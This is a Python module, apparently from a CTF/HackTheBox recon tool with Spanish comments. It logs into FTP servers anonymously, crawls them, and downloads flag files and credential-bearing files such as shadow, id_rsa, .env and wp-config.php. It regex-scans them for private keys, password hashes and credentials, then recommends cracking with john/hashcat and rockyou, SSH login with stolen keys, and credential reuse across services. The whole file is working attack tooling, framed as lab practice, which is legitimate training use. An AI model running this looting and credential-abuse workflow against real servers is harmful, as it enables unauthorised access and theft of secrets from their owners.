import ftplib
import io
import re
import tempfile
from pathlib import Path
from typing import Any, Optional

FLAG_FILENAMES = ("flag.txt", "user.txt", "root.txt")
FLAG_PATTERN = re.compile(r"(HTB\{[^}]+\}|flag\{[^}]+\}|[a-f0-9]{32})", re.I)


def _append_step(steps: list[dict], action: str, detail: str, status: str = "ok") -> None:
    steps.append({"action": action, "detail": detail, "status": status})


def _retrieve_text(ftp: ftplib.FTP, filename: str) -> str:
    buffer = io.BytesIO()
    ftp.retrbinary(f"RETR {filename}", buffer.write)
    return buffer.getvalue().decode("utf-8", errors="replace").strip()


def _list_files(ftp: ftplib.FTP) -> list[str]:
    try:
        return [name for name in ftp.nlst() if name not in (".", "..")]
    except ftplib.error_perm:
        lines: list[str] = []
        ftp.retrlines("LIST", lines.append)
        return lines


def probe_ftp_anonymous(
    host: str,
    port: int = 21,
    timeout: int = 20,
) -> dict[str, Any]:
    steps: list[dict] = []
    result: dict[str, Any] = {
        "module": "ftp_anonymous",
        "host": host,
        "port": port,
        "success": False,
        "anonymous_login": False,
        "steps": steps,
        "files": [],
        "flags": [],
        "error": None,
    }

    ftp: Optional[ftplib.FTP] = None
    try:
        _append_step(steps, "connect", f"Conexión FTP a {host}:{port}")
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, port)

        _append_step(steps, "login", "Login anonymous / anonymous@recontool.local")
        ftp.login("anonymous", "anonymous@recontool.local")
        result["anonymous_login"] = True
        _append_step(steps, "login_ok", "Acceso anónimo concedido")

        files = _list_files(ftp)
        result["files"] = files
        _append_step(steps, "list", f"Directorio remoto: {', '.join(files) or '(vacío)'}")

        targets = [f for f in files if f.lower() in FLAG_FILENAMES]
        if not targets:
            targets = [f for f in files if "flag" in f.lower() and f.lower().endswith(".txt")]

        for filename in targets:
            _append_step(steps, "download", f"Descargando {filename}")
            content = _retrieve_text(ftp, filename)
            result["flags"].append({"filename": filename, "content": content})
            _append_step(steps, "download_ok", f"{filename} obtenido ({len(content)} bytes)")
            result["success"] = True

        if result["anonymous_login"] and not result["success"]:
            _append_step(
                steps,
                "hint",
                "FTP anónimo OK pero no se encontró flag.txt — prueba: ls, get flag.txt",
                status="info",
            )

    except ftplib.error_perm as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", f"FTP rechazó la operación: {exc}", status="error")
    except (TimeoutError, OSError, ftplib.error_temp) as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", f"Error de red FTP: {exc}", status="error")
    except Exception as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), status="error")
    finally:
        if ftp is not None:
            try:
                ftp.quit()
            except Exception:
                pass

    return result


def manual_ftp_playbook(host: str) -> list[str]:
    return [
        f"ftp {host}",
        "Usuario: anonymous",
        "Contraseña: (cualquier valor o Enter)",
        "ls -la",
        "get flag.txt",
        "exit",
        "cat flag.txt",
    ]


def run_exploitation_checks(target: str, scan_data: dict) -> dict[str, Any]:
    attempts: list[dict] = []
    ftp_ports = [
        int(row["port"])
        for row in scan_data.get("results", [])
        if str(row.get("state", "")).lower() == "open"
        and int(row.get("port", 0)) in (21, 2121)
        and str(row.get("service", "")).lower() in ("ftp", "ftps", "")
    ]

    if not ftp_ports and any(int(r.get("port", 0)) == 21 for r in scan_data.get("results", [])):
        ftp_ports = [21]

    for port in sorted(set(ftp_ports)):
        attempts.append(probe_ftp_anonymous(target, port))

    flags = [flag for attempt in attempts for flag in attempt.get("flags", [])]
    playbook_steps = manual_ftp_playbook(target) if ftp_ports else []

    return {
        "attempts": attempts,
        "flag_captured": bool(flags),
        "flags": flags,
        "playbook_steps": playbook_steps,
    }


# ===========================================================================
# Fase 2 — Enumeración FTP enriquecida para el CLI
# ===========================================================================
# Recorre el árbol accesible por FTP anónimo, descarga ficheros pequeños e
# "interesantes", detecta la flag y clasifica hallazgos (hashes, claves
# privadas, credenciales) para recomendar el siguiente paso (john, ssh, etc.).
# Los helpers de clasificación son funciones puras (testeables sin red).

# Extensiones que suele merecer la pena revisar en una máquina fácil.
INTERESTING_EXT = {
    ".txt", ".conf", ".cfg", ".ini", ".bak", ".old", ".backup", ".sql", ".db",
    ".zip", ".tar", ".gz", ".7z", ".key", ".pem", ".ppk", ".pub", ".php",
    ".env", ".log", ".csv", ".xml", ".yml", ".yaml", ".sh", ".py", ".pl",
}
# Nombres típicos de ficheros con credenciales/config sensible.
CRED_FILENAMES = {
    "wp-config.php", "config.php", "configuration.php", ".env", "settings.py",
    "web.config", ".htpasswd", "credentials", "creds.txt", "passwords.txt",
    "password.txt", "database.yml", "db.php", ".git-credentials", "shadow",
    "passwd", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
}

# Patrones de hash / secretos.
_RE_SHADOW = re.compile(r"^[A-Za-z0-9_.\-]+:\$[0-9a-z]{1,3}\$[^\s:]+", re.M)
_RE_UNIX_CRYPT = re.compile(r"\$(1|2[abxy]?|5|6|y)\$[./A-Za-z0-9$]{6,}")
_RE_HEX32 = re.compile(r"\b[a-f0-9]{32}\b", re.I)
_RE_HEX40 = re.compile(r"\b[a-f0-9]{40}\b", re.I)
_RE_HEX64 = re.compile(r"\b[a-f0-9]{64}\b", re.I)
_RE_PRIVKEY = re.compile(r"-----BEGIN (?:OPENSSH |RSA |DSA |EC |)PRIVATE KEY-----")
_RE_CRED_LINE = re.compile(
    r"(?i)\b(pass(word|wd)?|db_pass(word)?|secret|api[_-]?key|token|user(name)?)\b"
    r"(?:\s*[:=]\s*|['\"]\s*,\s*['\"])\S"
)

ROCKYOU = "/usr/share/wordlists/rockyou.txt"


def classify_filename(name: str) -> list[str]:
    """Etiqueta un nombre de fichero: flag / credential / key / interesting."""
    low = name.lower().lstrip("/")
    base = low.rsplit("/", 1)[-1]
    tags: list[str] = []
    if base in FLAG_FILENAMES or ("flag" in base and base.endswith(".txt")):
        tags.append("flag")
    if base in CRED_FILENAMES:
        tags.append("credential")
    if base.startswith("id_") or base.endswith((".key", ".pem", ".ppk")):
        tags.append("key")
    ext = "." + base.rsplit(".", 1)[-1] if "." in base else ""
    if ext in INTERESTING_EXT and not tags:
        tags.append("interesting")
    return tags


def _hashcat_hint(sample: str) -> str:
    s = sample
    if s.startswith("$6$"):
        return "sha512crypt → john --format=sha512crypt  |  hashcat -m 1800"
    if s.startswith("$1$"):
        return "md5crypt → john --format=md5crypt  |  hashcat -m 500"
    if s.startswith(("$2a$", "$2b$", "$2y$")):
        return "bcrypt → john --format=bcrypt  |  hashcat -m 3200"
    if s.startswith("$5$"):
        return "sha256crypt → john --format=sha256crypt  |  hashcat -m 7400"
    return "posible MD5/NTLM → hashcat -m 0 (MD5) o -m 1000 (NTLM); john identificará el formato"


def scan_text_for_secrets(name: str, text: str) -> list[dict]:
    """Analiza el contenido de un fichero y devuelve hallazgos sensibles.

    Nota: en un fichero tipo flag (flag.txt/user.txt/root.txt) el hex de 32
    caracteres es la FLAG, no un hash a crackear.
    """
    findings: list[dict] = []
    is_flag_file = "flag" in classify_filename(name)

    if _RE_PRIVKEY.search(text):
        findings.append({
            "type": "private_key",
            "file": name,
            "detail": "Clave privada SSH encontrada",
        })

    shadow = _RE_SHADOW.findall(text)
    crypt = _RE_UNIX_CRYPT.findall(text)
    if shadow or crypt:
        sample_match = _RE_UNIX_CRYPT.search(text)
        sample = sample_match.group(0) if sample_match else "$6$"
        findings.append({
            "type": "hash",
            "file": name,
            "detail": f"Hash de contraseña tipo crypt detectado ({sample[:3]}...)",
            "sample": sample,
        })

    if not is_flag_file:
        for rx, label in ((_RE_HEX64, "SHA-256"), (_RE_HEX40, "SHA-1"), (_RE_HEX32, "MD5/NTLM")):
            m = rx.search(text)
            if m:
                findings.append({
                    "type": "hash",
                    "file": name,
                    "detail": f"Cadena hex ({label}) — posible hash",
                    "sample": m.group(0),
                })
                break

    if _RE_CRED_LINE.search(text):
        findings.append({
            "type": "credential",
            "file": name,
            "detail": "Posibles credenciales en texto (usuario/contraseña/clave)",
        })

    return findings


def build_ftp_recommendations(findings: list[dict], interesting: list[str], host: str) -> list[str]:
    """Convierte hallazgos en recomendaciones concretas de siguiente paso."""
    recs: list[str] = []
    seen_hash = False
    for f in findings:
        if f["type"] == "hash" and not seen_hash:
            seen_hash = True
            sample = f.get("sample", "")
            recs.append(
                f"Hash en '{f['file']}': guárdalo en un fichero y crackéalo → "
                f"{_hashcat_hint(sample)} (wordlist: {ROCKYOU})"
            )
        elif f["type"] == "private_key":
            recs.append(
                f"Clave privada en '{f['file']}': chmod 600 la clave y prueba "
                f"ssh -i <clave> <usuario>@{host}. Si pide passphrase: "
                f"ssh2john <clave> > key.hash && john key.hash"
            )
        elif f["type"] == "credential":
            recs.append(
                f"Credenciales en '{f['file']}': pruébalas en los servicios abiertos "
                f"(SSH, panel web, DB) — la reutilización de contraseñas es común en labs."
            )
    if interesting and not recs:
        recs.append(
            "Revísalos a mano: abre otra terminal y conéctate con "
            f"`ftp {host}` (usuario anonymous, contraseña vacía); descarga con "
            "`get <fichero>` y ábrelos buscando pistas, rutas o credenciales."
        )
    return recs


def _ftp_entries(ftp: ftplib.FTP, path: str) -> list[tuple[str, str]]:
    """Devuelve [(nombre, tipo)] de un directorio. Usa MLSD si está; si no, nlst+heurística."""
    entries: list[tuple[str, str]] = []
    try:
        for name, facts in ftp.mlsd(path):
            if name in (".", ".."):
                continue
            entries.append((name, facts.get("type", "file")))
        if entries:
            return entries
    except Exception:
        pass
    # Fallback: nlst + prueba de cwd para distinguir dir de file.
    try:
        names = [n.rsplit("/", 1)[-1] for n in ftp.nlst(path)]
    except Exception:
        names = []
    pwd = ftp.pwd()
    for name in names:
        if name in (".", ".."):
            continue
        kind = "file"
        try:
            ftp.cwd(f"{path}/{name}" if path not in ("", ".") else name)
            kind = "dir"
            ftp.cwd(pwd)
        except Exception:
            kind = "file"
        entries.append((name, kind))
    return entries


def enumerate_ftp_anonymous(
    host: str,
    port: int = 21,
    loot_dir: Optional[str] = None,
    timeout: int = 20,
    max_depth: int = 2,
    max_files: int = 40,
    max_bytes: int = 262_144,
) -> dict[str, Any]:
    """Enumeración FTP anónima completa para el CLI (Fase 2)."""
    steps: list[dict] = []
    loot = Path(loot_dir) if loot_dir else Path(tempfile.mkdtemp(prefix="recontool_ftp_"))
    loot.mkdir(parents=True, exist_ok=True)

    result: dict[str, Any] = {
        "module": "ftp_anonymous",
        "host": host,
        "port": port,
        "success": False,
        "anonymous_login": False,
        "steps": steps,
        "files": [],
        "listing": [],
        "interesting": [],
        "secrets": [],
        "flags": [],
        "recommendations": [],
        "error": None,
    }

    ftp: Optional[ftplib.FTP] = None
    try:
        _append_step(steps, "connect", f"ftp {host} {port}")
        ftp = ftplib.FTP(timeout=timeout)
        ftp.connect(host, port)
        _append_step(steps, "login", "Login anonymous (contraseña vacía)")
        ftp.login("anonymous", "anonymous@recontool.local")
        result["anonymous_login"] = True
        _append_step(steps, "login_ok", "Acceso anónimo concedido")

        downloaded = 0
        all_files: list[str] = []

        def walk(path: str, depth: int) -> None:
            nonlocal downloaded
            for name, kind in _ftp_entries(ftp, path):
                full = f"{path}/{name}".lstrip("/") if path not in ("", ".") else name
                if kind == "dir":
                    result["listing"].append(full + "/")
                    if depth < max_depth:
                        walk(full, depth + 1)
                    continue

                result["listing"].append(full)
                all_files.append(full)
                tags = classify_filename(name)
                if tags:
                    result["interesting"].append({"path": full, "tags": tags})

                should_grab = bool(tags) and downloaded < max_files
                if not should_grab:
                    continue
                try:
                    size = None
                    try:
                        size = ftp.size(full)
                    except Exception:
                        size = None
                    if size is not None and size > max_bytes:
                        _append_step(steps, "skip", f"{full} ({size} bytes) demasiado grande, no se descarga", "info")
                        continue
                    buf = io.BytesIO()
                    ftp.retrbinary(f"RETR {full}", buf.write)
                    data = buf.getvalue()
                    downloaded += 1
                    (loot / name).write_bytes(data[:max_bytes])
                    text = data.decode("utf-8", errors="replace")
                    _append_step(steps, "get", f"Descargado {full} ({len(data)} bytes)")

                    if "flag" in tags:
                        fmatch = FLAG_PATTERN.search(text)
                        if fmatch:
                            content = fmatch.group(0)
                        else:
                            lines = text.strip().splitlines()
                            content = lines[0] if lines else ""
                        if content:
                            result["flags"].append({"filename": name, "content": content})
                            result["success"] = True
                            _append_step(steps, "flag", f"Flag en {full}: {content}")

                    for finding in scan_text_for_secrets(name, text):
                        result["secrets"].append(finding)
                        _append_step(steps, "secret", f"{finding['detail']} en {full}", "info")
                except Exception as exc:
                    _append_step(steps, "get_error", f"No se pudo leer {full}: {exc}", "error")

        walk(".", 0)
        result["files"] = all_files
        _append_step(steps, "list", f"{len(all_files)} fichero(s), {len(result['interesting'])} interesante(s)")

        result["recommendations"] = build_ftp_recommendations(
            result["secrets"],
            [i["path"] for i in result["interesting"]],
            host,
        )
        for rec in result["recommendations"]:
            _append_step(steps, "recommend", rec, "info")

        if result["anonymous_login"] and not result["flags"]:
            _append_step(
                steps, "hint",
                "Anónimo OK pero sin flag directa: revisa los ficheros interesantes y escala con las recomendaciones.",
                "info",
            )

    except ftplib.error_perm as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", f"FTP rechazó la operación: {exc}", "error")
    except (TimeoutError, OSError, ftplib.error_temp) as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", f"Error de red FTP: {exc}", "error")
    except Exception as exc:
        result["error"] = str(exc)
        _append_step(steps, "error", str(exc), "error")
    finally:
        if ftp is not None:
            try:
                ftp.quit()
            except Exception:
                pass

    return result
